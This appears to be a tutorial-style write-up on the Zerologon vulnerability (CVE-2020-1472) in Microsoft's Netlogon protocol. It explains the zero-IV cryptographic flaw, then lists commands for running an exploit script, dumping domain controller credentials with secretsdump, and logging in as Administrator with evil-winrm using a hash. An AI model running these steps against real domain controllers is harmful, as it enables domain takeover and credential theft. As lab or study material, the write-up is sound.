Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.

Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC.

MS-NRPC (Microsoft NetLogon Remote Protocol) : 

MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts.

the attack mainly focuses on a poor implementation of Cryptography.

Microsoft chose to use `AES-CFB8` for a function called `ComputeNetlogonCredential`, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero. 

**machines account vs user account**

- if we tried a statistics based attack on any user account, we would get locked out. 
-  This is not the case if we apply this principal to machine accounts. 

***

```
Use Zero Logon to bypass authentication on the Domain Controller's Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit

```

***

Zerologin vulnerability present within the way Microsoft handles Authentication within `ComputeNetLogonCredetial` function of `MS-NRPC`. 

Lets understand the `MS-NRPC`.

[img](https://www.zdnet.com/a/hub/i/2020/09/11/91ce3485-5a9b-4fd7-9bdb-908084954c58/zerologon-attack.png)


Step 1. The client creates a NetrServerReqChallenge and sends it off. This contains the following values:

```
1. The DC
2. The Target Device (Also the DC, in our case)
3. A Nonce (In our case is 16 Bytes of Zero).

```

Step 2. The server receives the NetrServerReqChallenge, the server will then generate it's own Nonce (This is called the Server Challenge), the server will send the Server Challenge back.

Step 3. The client (us) will compute it's NetLogon Credentials with the Server Challenge provided [Figure 1. Step 3]. It uses the NetrServerAuthenticate3 method which requires the following parameters

```
1. A Custom Binding Handle (Impacket handles this for us, it's negotiated prior)
2. An Account Name (The Domain Controller's machine account name. ex: DC01$)
3. A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel])
4. The Computer Name (The Domain Controller ex: DC01)
5. The Client Credential String (this will be 8 hextets of \x00 [16 Bytes of Zero])  
6. Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)

```

Step 4. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it's known, good values. If the results are good, the server will send the required info back to the client. 

The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we're hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in.

Step 5. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful.

****

## Impacket installation

```
python3 -m pip install virtualenv

python3 -m virtualenv impacketEnv

source impacketEnv/bin/activate

pip install git+https://github.com/SecureAuthCorp/impacket

```

****

## how to exploit.

check if vulnerable or not.

`python3 zerologon-exploit.py <dc-name> <dc-ip>`

```

 _____                   __                          
/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  
\// / / _ \ '__/ _ \   / /  / _ \ / _` |/ _ \| '_ \ 
 / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |
/____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|
                                  |___/             
                Vulnerability Discovered by Tom Tervoort
                              Exploit by Ronnie Bartwitz
   
Performing authentication attempts...
Failure to Autheticate at attempt number: 56
Zero Logon successfully exploited, changing password.


```

dump the passwords :

`python3 secretsdump.py -just-dc -no-pass DC01\$@$ip`

log in with evil-rm

`evil-winrm -u Administrator -H ntlm hash -i $ip`
eg :
`evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i $ip`